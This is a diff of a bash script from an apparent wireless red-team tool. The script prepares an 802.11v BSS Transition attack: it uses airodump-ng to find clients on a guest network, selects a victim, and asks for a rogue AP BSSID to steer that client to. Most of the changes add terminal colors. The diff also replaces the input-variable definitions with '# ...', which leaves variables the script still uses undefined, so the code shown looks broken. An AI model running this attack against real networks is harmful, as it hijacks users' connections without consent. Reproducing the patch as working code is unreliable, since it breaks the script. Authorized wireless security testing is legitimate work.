@@ -24,32 +24,31 @@
 
 set -euo pipefail
 
+C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
+C_VAR="${ASTRA_COLOR_VAR:-}"
+C_BOLD="${ASTRA_COLOR_BOLD:-}"
+C_RESET="${ASTRA_COLOR_RESET:-}"
+
 # SNR Safeguard (Red Team Hardening)
 if [[ "${ASTRA_TARGET_RSSI:-0}" -ne 0 ]] && [[ "${ASTRA_TARGET_RSSI:-0}" -lt -75 ]]; then
-    echo -e "\n[!] WARNING: Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm)."
-    echo "[*] BSS Transition frames are highly likely to be dropped at this distance."
-    read -p "[?] Continue anyway? [y/N]: " snr_continue
+    echo -e "\n${C_PROMPT}[!] WARNING:${C_RESET} ${C_BOLD}Low Signal Strength Detected (${ASTRA_TARGET_RSSI}dBm).${C_RESET}"
+    echo -e "[*] BSS Transition frames are highly likely to be dropped at this distance."
+    read -p "$(echo -e "${C_BOLD}[?] Continue anyway? [y/N]: ${C_RESET}")" snr_continue
     [[ "$snr_continue" != "y" ]] && exit 0
 fi
 
 # Inputs from Environment
-INTERFACE="${MONITOR_INTERFACE:-}"
-SSID="${GUEST_SSID:-}"
-BSSID="${GUEST_BSSID:-}"
-SESSION_DIR="${SESSION_DIR:-.}"
-EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
-ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
-TC_ID="G5"
+# ...
 
 if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
     echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
     exit 1
 fi
 
-echo "[*] Initializing Active BSS Transition (802.11v) Attack against ${BSSID}..."
+echo -e "${C_PROMPT}[*]${C_RESET} Initializing Active BSS Transition (802.11v) Attack against ${C_VAR}${BSSID}${C_RESET}..."
 
 # 1. Identify clients
-echo "[*] Identifying active clients for transition targeting..."
+echo -e "${C_PROMPT}[*]${C_RESET} Identifying active clients for transition targeting..."
 CLIENT_FILE="${EVIDENCE_DIR}/g5_clients.txt"
 DISC_PREFIX="${EVIDENCE_DIR}/g5_discovery"
 airodump-ng --bssid "$BSSID" --write "$DISC_PREFIX" --output-format csv "$INTERFACE" > /dev/null 2>&1 &
@@ -64,20 +63,20 @@ CLIENTS=()
 while read -r c; do CLIENTS+=("$c"); done < "$CLIENT_FILE"
 
 if [[ ${#CLIENTS[@]} -eq 0 ]]; then
-    echo "[!] No clients discovered on ${BSSID}. Attack aborted."
+    echo -e "${C_PROMPT}[!]${C_RESET} No clients discovered on ${BSSID}. Attack aborted."
     exit 0
 fi
 
-echo "[?] Select target client for transition:"
+echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select target client for transition:${C_RESET}"
 for i in "${!CLIENTS[@]}"; do
     echo "    $((i+1))) ${CLIENTS[$i]}"
 done
-read -p "Selection [1-${#CLIENTS[@]}]: " choice
+read -p "$(echo -e "${C_BOLD}Selection [1-${#CLIENTS[@]}]: ${C_RESET}")" choice
 TARGET_CLIENT="${CLIENTS[$((choice-1))]}"
 
-read -p "[?] Enter Rogue AP BSSID (to transition the client to): " ROGUE_BSSID
+read -p "$(echo -e "${C_BOLD}[?] Enter Rogue AP BSSID: ${C_RESET}")" ROGUE_BSSID
 if [[ -z "$ROGUE_BSSID" ]]; then
-    echo "[!] Rogue BSSID required."
+    echo -e "${C_PROMPT}[!]${C_RESET} Rogue BSSID required."
     exit 1
 fi
 
